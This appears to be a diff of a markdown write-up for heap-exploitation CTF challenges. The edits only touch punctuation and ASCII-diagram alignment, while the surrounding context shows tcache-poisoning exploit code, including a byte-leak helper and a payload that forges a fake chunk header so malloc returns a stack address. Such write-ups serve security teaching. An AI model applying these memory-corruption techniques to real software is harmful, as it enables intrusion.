@@ -4954,7 +4954,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-The solution is the same as the easy version. The only difference is that the secret address is not printed — we have to find it from the binary. From the decompiled code we can see it is stored at `byte_428363`.
+The solution is the same as the easy version. The only difference is that the secret address is not printed, we have to find it from the binary. From the decompiled code we can see it is stored at `byte_428363`.
 
 ### Exploit
 
@@ -4995,7 +4995,7 @@ def leak_8_bytes(target):
     free(0)
     scanf(0, p64(target))
     malloc(0, 128)
-    malloc(1, 128)  # discarded — TCACHE HEAD = secret bytes at target
+    malloc(1, 128)  # discarded, TCACHE HEAD = secret bytes at target
     free(0)         # chunk 0's next = secret bytes
     return puts(0).ljust(8, b"\x00")[:8]
 
@@ -6250,7 +6250,7 @@ The goal is to make `malloc(63)` return the address of `v15` on the stack.
 
 ### Getting a Stack Address into the Tcache
 
-We cannot call `stack_free` directly to put `v15` into the TCACHE — the allocator detects that `v15` is not a valid heap chunk and aborts:
+We cannot call `stack_free` directly to put `v15` into the TCACHE, the allocator detects that `v15` is not a valid heap chunk and aborts:
 
 ```
 [*] free(0x7ffcd1c04590)
@@ -6263,14 +6263,14 @@ Instead we use TCACHE poisoning. The `stack_malloc_win` command helpfully prints
 The TCACHE bin for `malloc(63)` is the 57-72 byte bin (bin `#3`). We allocate two chunks of size 72 to match this bin, free them, and poison the first chunk's `next`:
 
 ```
-┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
-┊  TCACHE_perthread_struct Void                                        ┊
-┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓                      ┊
-┊    counts: ┃ count_72: 2    ┃ ...            ┃                      ┊
-┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫                      ┊
-┊   entries: ┃ entry_72: &A   ┃ ...            ┃                      ┊
-┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛                      ┊
-└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┊  TCACHE_perthread_struct Void                                         ┊
+┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓                        ┊
+┊    counts: ┃ count_72: 2    ┃ ...            ┃                        ┊
+┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫                        ┊
+┊   entries: ┃ entry_72: &A   ┃ ...            ┃                        ┊
+┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛                        ┊
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                               │
               ╭───────────────╯
               │
@@ -6287,9 +6287,9 @@ The TCACHE bin for `malloc(63)` is the 57-72 byte bin (bin `#3`). We allocate tw
          │
          v
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
-┆  STACK (v15)              ┆
+┆  STACK (v15)             ┆
 ├──────────────────────────┤
-│  _QWORD v15[10]           │
+│  _QWORD v15[10]          │
 └──────────────────────────┘
 ```
 
@@ -6484,7 +6484,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-The goal is the same as the easy version: make `malloc(0x75)` return `v13`'s address. The difference is that this binary prints nothing — no address leaks — and `stack_free` aborts immediately with `munmap_chunk(): invalid pointer` because `v13` has no valid chunk header in the memory before it.
+The goal is the same as the easy version: make `malloc(0x75)` return `v13`'s address. The difference is that this binary prints nothing, no address leaks, and `stack_free` aborts immediately with `munmap_chunk(): invalid pointer` because `v13` has no valid chunk header in the memory before it.
 
 ### Forging a Chunk Header
 
@@ -6525,7 +6525,7 @@ p.sendline(b"stack_scanf")
 p.sendline(b"A" * 56 + p64(0x81))
 p.recvuntil(b"quit): ")
 
-# now stack_free succeeds — v13 is a valid-looking chunk
+# now stack_free succeeds, v13 is a valid-looking chunk
 p.sendline(b"stack_free")
 p.recvuntil(b"quit): ")
 
